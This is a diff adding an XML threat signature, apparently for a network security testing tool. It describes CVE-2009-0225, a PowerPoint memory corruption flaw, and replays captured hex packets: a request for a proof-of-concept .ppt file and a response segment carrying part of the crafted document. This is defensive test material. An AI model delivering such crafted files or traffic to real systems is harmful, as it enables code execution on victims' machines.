@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Office PowerPoint PP7 File Handling Memory Corruption"/>
+    <EngDesc display="true" value="A memory corruption vulnerability exists in Microsoft Office PowerPoint. The flaw is due to an error when processing atoms in a malicious PowerPoint (PPT) document. An attacker could exploit this vulnerability by persuading a target user to open a specially crafted PowerPoint document. In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The injected code in such a case would execute within the security context of the logged in user. In an attack case where code injection is not successful, the affected application will terminate abnormally, potentially resulting in loss of unsaved data."/>
+    <Intent display="true">
+      <item value="Code_Execution/Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/FTP/IMAP/POP3/SMB/CIFS/SMTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Office_PowerPoint"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Office_PowerPoint_2002_Service_Pack_3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-0225"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="23b3fc2405eb836dbcffbb20cced893f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633982140943749589"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1262514640" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="TR"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="TS"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="TR"/>
+      <for index="TS"/>
+    </for>
+    <for index="TL">
+      <for index="TR"/>
+      <for index="TS"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:09:54:47" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01D2" Identification="1842" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="7ECD" srcIP="172.16.8.244" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1088" destPort="$HTTPdestPort" SeqNumber="AED010E4" AckNumber="B1770C70" HeaderLength="05" WindowSize="FAF0" Checksum="CEA8" UrgentPointer="0000" Options="" Payload="474554202F7E6D64656F6E6172696E652F706F632E70707420485454502F312E310D0A486F73743A203137322E31362E312E320D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D55533B2072763A312E392E302E3829204765636B6F2F323030393033323630392046697265666F782F332E302E380D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A526566657265723A20687474703A2F2F3137322E31362E312E322F7E6D64656F6E6172696E652F0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="TL" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:09:54:47" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0549" Identification="DA93" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F904" srcIP="$destIP" destIP="172.16.8.244" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1088" SeqNumber="B17F6CD0" AckNumber="AED0128E" HeaderLength="05" WindowSize="1920" Checksum="9A05" UrgentPointer="0000" Options="" Payload="85858585858585858585855F855F855F855F855F045F855F5F5F5F5F5F5F5F5F5F5F5F3C5F3C5F3C5F3C5F3C5F3C5F3C3C3C3C3C3C3C3C3C3C3C3C003C003C003C003C00000000FCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCA1FCFCFCA1FCFCFCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1A1A1FCA1A1A1A1A1A1A1A1A1A185A1A1A185A185A185A185A185A1858585A1858585858585858585855F85858504855F855F855F5F5F855F5F5F5F5F5F5F5F5F5F3C5F5F5F3C5F3C5F3C5F3C3C3C5F3C3C3C3C3C3C3C3C3C3C003C003C003C00FCFCFCFCFCFCFCFCFCFCFCFCFCFCA1FCFCFCFCFCFCFCA1FCFCFCA1FCFCFCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1A1A1FCA1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A185A185A185A185A185A185A1858585A18585858585858585858585855F855F855F855F045F5F5F855F5F5F5F5F5F5F5F5F5F5F5F3C5F3C5F3C5F3C5F3C3C3C5F3C3C3C3C3C3C3C3C3C3C3C3C003C003C003C003C0000FCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCFCA1FCFCFCA1FCFCFCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1FCA1A1A1A1A1A1A1A1A1A1A1A1A1A185A1A1A185A185A185A185A185A1858585A1858585858585858585855F8504855F855F855F855F5F5F855F5F5F5F5F5F5F5F5F5F3C5F3C5F3C5F3C5F3C5F3C3C3C5F3C3C3C3C3C3C3C3C3C3C003C003C000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000054776F000800000053756D6D617279001E000000576865726520746F20476574204D6F726520496E666F726D6174696F6E000C100000060000001E0000000B000000466F6E747320557365640003000000030000001E0000001000000044657369676E2054656D706C6174650003000000010000001E0000000D000000536C696465205469746C657300030000000900000000006400000004000000000000002800000001000000490000000200000051000000030000005900000002000000020000000800000056657273696F6E0003000000050000004C4349440002000000E404000003000000020000000300000009040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
